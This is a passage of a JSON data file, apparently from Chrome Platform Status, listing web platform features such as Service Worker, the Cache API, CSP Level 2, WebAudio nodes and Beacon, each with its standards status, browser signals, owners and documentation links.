          "bokan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 40,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=148816",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Pinch to zoom will behave rationally with respect to position:fixed elements. position:fixed elements no longer stick to the visual viewport during a pinch-zoom.\r\n",
    "id": 4876804200333312,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1KewSqexq4Pd99RUFB-yVoUIJocB1RDyQvcTLi9uOV8E/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:38.163600",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Deprecate Doppler Effect",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 41
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 41,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "bug": "http://crbug.com/439644",
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The W3C Audio Working Group has removed the doppler effect from the PannerNode as part of the rework of the PannerNode. The methods panner.setVelocity() and listener.setVelocity() and the attributes listener.speedOfSound and listener.dopplerFactor are now no-ops and will be removed in Chrome 55, around November 2016.",
    "id": 5238926818148352,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/372",
        "",
        "http://webaudio.github.io/web-audio-api/#the-audiolistener-interface",
        "",
        "http://webaudio.github.io/web-audio-api/#the-pannernode-interface"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 05:26:49.616920",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: StereoPannerNode",
    "tags": [
      "Web Audio API",
      "StereoPannerNode",
      "Panning Model",
      "Stereo"
    ],
    "comments": "See also: https://github.com/WebAudio/web-audio-api/issues/372",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/#the-stereopannernode-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WebAudio/web-audio-api/issues/372#issuecomment-62143390",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 41,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=432194",
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "StereoPannerNode is a audio processing node which positions an incoming audio stream in a stereo image using robust equal-power panning algorithm and sample-accurate automation.\r\n\r\nWeb Audio API specification has been updated to include a new audio node dedicated to equal-power stereo panning.",
    "id": 5796852263813120,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/StereoPannerNode"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 05:25:31.427070",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: suspend/resume",
    "comments": "The specification for suspend and resume has not yet been finalized, but any changes are expected to be very small.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=420106",
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 28
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Supports suspending and resuming an AudioContext to allow applications to pause the audio device when needed.  This reduces CPU usage and power consumption when audio is suspended.",
    "id": 5664622837235712,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#the-audiocontext-interface",
        "http://webaudio.github.io/web-audio-api/#methods"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/webaudio-suspend-resume"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:36.162890",
      "by": "ericbidelman@google.com"
    },
    "name": "image-rendering: pixelated",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/css-images-3/#the-image-rendering",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 41
        },
        "owners": [
          "jackhou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 41,
        "flag": false,
        "android": 41,
        "intervention": false
      },
      "opera": {
        "android": 28,
        "desktop": 26
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/imagerendering",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "\"image-rendering: pixelated\" indicates that image should be scaled \"so that the image appears to be simply composed of very large pixels\", e.g. using nearest-neighbour.",
    "id": 5118058116939776,
    "resources": {
      "docs": [
        "https://dev.opera.com/blog/opera-26/#css-image-rendering-pixelated",
        "http://updates.html5rocks.com/2015/01/pixelated",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/image-rendering"
      ],
      "samples": [
        "http://jsfiddle.net/zda24/147/",
        "https://github.com/GoogleChrome/samples/tree/gh-pages/image-rendering-pixelated"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-04-26 05:22:52.213340",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "Cache API",
    "tags": [
      "service",
      "worker",
      "serviceworker",
      "cache"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/#cache-objects",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=903441",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 40
        },
        "owners": [
          "jsbell@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 40,
        "blink_components": [
          "Blink"
        ],
        "desktop": 40,
        "flag": false,
        "android": 40,
        "bug": "http://crbug.com/425426",
        "intervention": false
      },
      "opera": {
        "android": 27,
        "desktop": 27
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/serviceworker?term=Service%20Worker",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Cache API allow authors to fully and conveniently manage their content caches for offline use. An origin can have multiple, named Cache objects which are accessible via workers and document scripts.",
    "id": 6461631328419840,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache",
        "https://developer.mozilla.org/en-US/docs/Web/API/CacheStorage"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/blob/gh-pages/service-worker/README.md"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:33.830880",
      "by": "ericbidelman@google.com"
    },
    "name": "Content Security Policy Level 2",
    "tags": [
      "csp"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/CSP2/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 40
        },
        "owners": [
          "mkwst@chromium.org",
          "jww@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 40,
        "flag": false,
        "android": 40,
        "webview": 40,
        "intervention": false
      },
      "opera": {
        "android": 27,
        "desktop": 27
      },
      "edge": {
        "view": {
          "url": "http://lists.w3.org/Archives/Public/public-webappsec/2014Aug/0152.html",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#specification-content-security-policy-level-2",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An evolution of the Content Security Policy specification, allowing developers to create a whitelist of sources of trusted content, and instructing the browser to only execute or render resources from those sources.",
    "id": 4957003285790720,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-04-26 05:22:30.722590",
      "by": "Patket@microsoft.com"
    },
    "name": "Service Worker",
    "comments": "Re: strongly positive web developer views\r\n - we are seeing extremely positive feedback whenever there is a talk about SW\r\n - high profile web developers have already started prototyping with the API\r\n - overall, everyone we've talked to is eager to see this API shipping.\r\n - it's one of the top voted FR at IE's user voice page https://wpdev.uservoice.com/forums/257854-internet-explorer-platform",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://slightlyoff.github.io/ServiceWorker/spec/service_worker/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://platform-status.mozilla.org/#service-worker",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 40
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "dominicc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 40,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 40,
        "flag": false,
        "android": 40,
        "bug": "http://crbug.com/364627",
        "intervention": false
      },
      "opera": {
        "android": 27,
        "desktop": 27
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/serviceworker",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "ServiceWorkers (formerly Navigation Controllers) are a new system that provides event-driven scripts that run independent of web pages. They are similar to SharedWorkers except that their lifetime is different and they have access to domain-wide events such as network fetches.\r\n\r\nUse cases: offline, reducing perceived page load latency and will eventually power notification/push/sync/... use cases. ",
    "id": 6561526227927040,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorker_API",
        "http://www.html5rocks.com/en/tutorials/service-worker/introduction/",
        "http://jakearchibald.com/2014/using-serviceworker-today/"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/service-worker",
        "https://github.com/jakearchibald/trained-to-thrill"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:16.035480",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: PannerNode default behavior",
    "tags": [
      "Web Audio API",
      "PannerNode",
      "Panning Model",
      "HRTF",
      "Stereo"
    ],
    "comments": "See also: https://github.com/WebAudio/web-audio-api/issues/368",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 40
        },
        "owners": [
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 40,
        "flag": false,
        "android": 40,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=424356",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The HRTF panner uses significant memory for the responses and requires a fair amount of processing to implement. For low-end mobile devices, this can be an issue. Since the default panner model is HRTF, the creation of the panner can cause the responses to be loaded.\r\n\r\nThe default has been changed to equalpower, which doesn't consume significant memory and is much less intensive in processing power.",
    "id": 6587368576385024,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-26 05:22:08.604040",
      "by": "Patket@microsoft.com"
    },
    "name": "minlength attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fe-minlength",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=932755",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 40
        },
        "owners": [
          "keishi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 40,
        "flag": false,
        "android": 40,
        "webview": 40,
        "intervention": false
      },
      "opera": {
        "android": 27,
        "desktop": 27
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "minlength attribute declares a lower bound on the number of characters a user can input.",
    "id": 6023370181181440,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Input#attr-minlength",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/textarea#attr-minlength"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/report-validity"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-26 05:17:38.566540",
      "by": "Patket@microsoft.com"
    },
    "name": "reportValidity() for form controls",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#dom-cva-reportvalidity",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 40
        },
        "owners": [
          "keishi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 40,
        "flag": false,
        "android": 40,
        "webview": 40,
        "intervention": false
      },
      "opera": {
        "android": 27,
        "desktop": 27
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "reportValidity() invokes built-in form validation UI programatically.\r\n",
    "id": 5433505009893376,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/reportValidity"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/report-validity"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-12-14 17:18:25.300950",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Beacon",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/webperf/raw-file/tip/specs/Beacon/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=936340",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 39
        },
        "owners": [
          "sof@opera.com",
          "sidv@chromium.org",
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 39,
        "flag": false,
        "android": 39,
        "bug": "http://crbug.com/360603",
        "intervention": false
      },
      "opera": {
        "android": 26,
        "desktop": 26
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/beacon",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This specification defines an interoperable means for site developers to asynchronously transfer small HTTP data from the User Agent to a web server.\r\n\r\nInitiated by the navigator.sendBeacon() method, the 'beacon' data will be transmitted by the User Agent as soon as possible, but independent of document navigation. The sendBeacon method returns true if the user agent is able to successfully queue the data for transfer. Otherwise it returns false.",
    "id": 5517433905348608,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon",
        "http://updates.html5rocks.com/2014/10/Send-beacon-data-in-Chrome-39"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/beacon"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-26 05:15:39.544250",
      "by": "Patket@microsoft.com"
    },
    "name": "Generators (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-generator-function-definitions",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/26#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 39
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 39,
        "flag": false,
        "android": 39,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2355",
        "intervention": false
      },
      "opera": {
        "android": 26,
        "desktop": 26
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/generatorses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-generators",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "A generator is a special type of function that works as a factory for iterators.",
    "id": 4959347197083648,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator",
        "http://updates.html5rocks.com/2014/10/Generators-the-Gnarly-Bits"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/generators"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:44.201640",
      "by": "ericbidelman@google.com"
    },
    "name": "Web Animations Javascript API [playback control]",
    "tags": [
      "animation"
    ],
    "comments": "Builds on http://www.chromestatus.com/feature/4854343836631040",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/fxtf/web-animations/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1245000",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 39
        },
        "owners": [
          "dstockwell@chromium.org",
          "shans@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 39,
        "flag": false,
        "android": 39,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=396369",
        "intervention": false
      },
      "opera": {
        "android": 26,
        "desktop": 26
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/webanimationsjavascriptapi",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2013-October/025758.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A unified model for supporting animation and synchronization on the Web platform. This feature covers playback control of AnimationPlayer: play(), pause(), reverse(), finish(), currentTime, startTime, playbackRate and playState.",
    "id": 5633748733263872,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2014/05/Web-Animations---element-animate-is-now-in-Chrome-36"
      ],
      "samples": [
        "http://web-animations.github.io"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-26 05:09:28.017560",
      "by": "Patket@microsoft.com"
    },
    "name": "Web Application Manifest",
    "comments": "Firefox is shipping a proprietary API. They are working toward implementing the standard.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/manifest/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 39
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 39,
        "flag": false,
        "android": 39,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=366145",
        "intervention": false
      },
      "opera": {
        "android": 26,
        "desktop": 26
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This specification defines a JSON-based manifest, which provides developers with a centralized place to put metadata associated with a web application. This includes, but is not limited to, the web application's name, links to icons, as well as the preferred URL to open when the user launches the web application. The manifest also allows developers to declare a default orientation for their web application, as well as how the application is to be displayed by the user agent (e.g. in fullscreen).",
    "id": 6488656873259008,
    "resources": {
      "docs": [
        "https://developer.chrome.com/multidevice/android/installtohomescreen#supporting",
        "http://updates.html5rocks.com/2014/11/Support-for-installable-web-apps-with-webapp-manifest-in-chrome-38-for-Android",
        "https://developer.mozilla.org/en-US/docs/Web/Manifest"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/web-application-manifest"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:40.300540",
      "by": "ericbidelman@google.com"
    },
    "name": "meta-theme-color",
    "comments": "Microsoft has msapplication-TileColor http://goo.gl/xrpBD and Firefox for Android added support for it http://goo.gl/X2Um5t",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/whatwg/meta-theme-color",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 39
        },
        "owners": [
          "michaelbai@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 39,
        "flag": false,
        "android": 39,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=383941",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The meta-theme-color is the color of the brand, browser may use it when a distinct color representation is needed.\r\n",
    "id": 5398016231997440,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2014/11/Support-for-theme-color-in-Chrome-39-for-Android"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/web-application-manifest"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-26 05:08:17.161020",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "<picture> Element",
    "comments": "The specification was recently rewritten to simplify its implementation and maintenance. Available behind a flag in Chromium 37.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/edits.html#embedded-content",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=870022",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "http://crbug.com/233751",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/pictureelement",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enable a responsive images solution by declaring multiple resources for an image using CSS media queries.",
    "id": 5910974510923776,
    "resources": {
      "docs": [
        "http://docs.webplatform.org/wiki/html/elements/picture",
        "http://www.smashingmagazine.com/2014/05/14/responsive-images-done-right-guide-picture-srcset/",
        "http://ericportis.com/posts/2014/srcset-sizes/",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture"
      ],
      "samples": [
        "http://scottjehl.github.io/picturefill/",
        "https://github.com/GoogleChrome/samples/tree/gh-pages/picture-element"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-09-19 07:17:25.900700",
      "by": "ericbidelman@google.com"
    },
    "name": "Battery Status API",
    "comments": "Firefox removed support for the API in Firefox 52 due to privacy concerns.\r\nhttps://groups.google.com/d/msg/mozilla.dev.platform/5U8NHoUY-1k/9ybyzQIYCAAJ",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/battery-status/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
